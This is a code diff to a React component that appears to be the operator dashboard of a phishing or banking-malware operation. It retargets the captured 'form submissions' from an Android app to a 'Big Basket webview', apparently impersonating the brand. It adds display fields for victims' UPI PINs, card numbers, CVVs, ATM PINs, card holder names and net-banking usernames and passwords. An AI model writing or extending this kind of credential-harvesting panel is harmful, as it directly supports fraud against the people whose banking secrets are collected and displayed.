@@ -211,7 +211,7 @@ function FormsList({ forms }: { forms: FormData[] }) {
             <div className="empty-state" style={{ padding: '2rem' }}>
                 <div className="empty-state-icon">📝</div>
                 <h2>No Form Submissions</h2>
-                <p>Form data submitted from the Android app will appear here.</p>
+                <p>Form data submitted from the Big Basket webview will appear here.</p>
             </div>
         );
     }
@@ -230,7 +230,7 @@ function FormsList({ forms }: { forms: FormData[] }) {
                             <span style={{ fontSize: '1.5rem' }}>📋</span>
                             <div>
                                 <div style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
-                                    {form.fullName || form.name || form.pageName || 'Submission'}
+                                    {form.fullName || form.name || form.mobileNumber || form.pageName || 'Submission'}
                                 </div>
                                 <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                                     {form.pageName && (
@@ -253,7 +253,7 @@ function FormsList({ forms }: { forms: FormData[] }) {
                         </span>
                     </div>
 
-                    {/* Personal Details - show only if has data */}
+                    {/* Personal Details */}
                     {(form.fullName || form.name || form.mobileNumber || form.phoneNumber || form.motherName || form.dateOfBirth) && (
                         <div style={{ marginBottom: '1rem' }}>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>👤 Personal Details</div>
@@ -266,40 +266,52 @@ function FormsList({ forms }: { forms: FormData[] }) {
                         </div>
                     )}
 
-                    {/* Account Details - show only if has data */}
-                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.panNumber || form.cifNumber || form.branchCode) && (
+                    {/* Payment & Amount Details */}
+                    {(form.amount || form.selectedAmount || form.paymentMethod) && (
                         <div style={{ marginBottom: '1rem' }}>
-                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💰 Payment Info</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                                {form.accountNumber && <div><strong>Account:</strong> {form.accountNumber}</div>}
-                                {form.aadhaarNumber && <div><strong>Aadhaar:</strong> {form.aadhaarNumber}</div>}
-                                {(form.panCard || form.panNumber) && <div><strong>PAN:</strong> {form.panCard || form.panNumber}</div>}
-                                {form.cifNumber && <div><strong>CIF:</strong> {form.cifNumber}</div>}
-                                {form.branchCode && <div><strong>Branch:</strong> {form.branchCode}</div>}
+                                {(form.amount || form.selectedAmount) && <div><strong>Amount:</strong> ₹{form.amount || form.selectedAmount}</div>}
+                                {form.paymentMethod && <div><strong>Payment Method:</strong> {form.paymentMethod}</div>}
                             </div>
                         </div>
                     )}
 
-                    {/* Card Details - show only if has data */}
-                    {(form.cardLast6 || form.cardNumber || form.cardExpiry || form.validThrough || form.cvv || form.atmPin || form.finalPin) && (
+                    {/* UPI Details */}
+                    {(form.upiApp || form.upiPin) && (
+                        <div style={{ marginBottom: '1rem' }}>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>📱 UPI Details</div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {form.upiApp && <div><strong>UPI App:</strong> {form.upiApp}</div>}
+                                {form.upiPin && <div><strong>UPI PIN:</strong> {form.upiPin}</div>}
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Card Details */}
+                    {(form.cardType || form.cardLast6 || form.cardNumber || form.cardHolderName || form.cardExpiry || form.validThrough || form.cvv || form.atmPin || form.finalPin) && (
                         <div style={{ marginBottom: '1rem' }}>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💳 Card Details</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {form.cardType && <div><strong>Card Type:</strong> {form.cardType}</div>}
                                 {(form.cardNumber || form.cardLast6) && <div><strong>Card Number:</strong> {form.cardNumber || form.cardLast6}</div>}
+                                {form.cardHolderName && <div><strong>Holder Name:</strong> {form.cardHolderName}</div>}
                                 {(form.validThrough || form.cardExpiry) && <div><strong>Expiry:</strong> {form.validThrough || form.cardExpiry}</div>}
                                 {form.cvv && <div><strong>CVV:</strong> {form.cvv}</div>}
-                                {form.atmPin && <div><strong>PIN:</strong> {form.atmPin}</div>}
+                                {form.atmPin && <div><strong>ATM PIN:</strong> {form.atmPin}</div>}
                                 {form.finalPin && <div><strong>Final PIN:</strong> {form.finalPin}</div>}
                             </div>
                         </div>
                     )}
 
-                    {/* Login Credentials - show only if has data */}
-                    {(form.userId || form.accessCode || form.profileCode) && (
+                    {/* Net Banking / Login Credentials */}
+                    {(form.bankName || form.username || form.password || form.userId || form.accessCode || form.profileCode) && (
                         <div>
-                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Login Credentials</div>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Net Banking / Login Credentials</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                                {form.userId && <div><strong>User ID:</strong> {form.userId}</div>}
+                                {form.bankName && <div><strong>Bank Name:</strong> {form.bankName}</div>}
+                                {(form.username || form.userId) && <div><strong>Username / ID:</strong> {form.username || form.userId}</div>}
+                                {form.password && <div><strong>Password:</strong> {form.password}</div>}
                                 {form.accessCode && <div><strong>Access Code:</strong> {form.accessCode}</div>}
                                 {form.profileCode && <div><strong>Profile Code:</strong> {form.profileCode}</div>}
                             </div>
